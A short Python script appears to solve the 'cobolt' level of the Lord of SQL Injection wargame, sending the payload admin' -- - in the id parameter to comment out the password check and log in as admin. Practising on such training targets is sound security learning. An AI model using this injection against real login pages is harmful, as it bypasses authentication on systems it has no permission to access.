from constants import *

chall_url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"

res = make_request(chall_url, "?id=" + urllib.parse.quote(f"admin' -- -"))
check_clear(res)
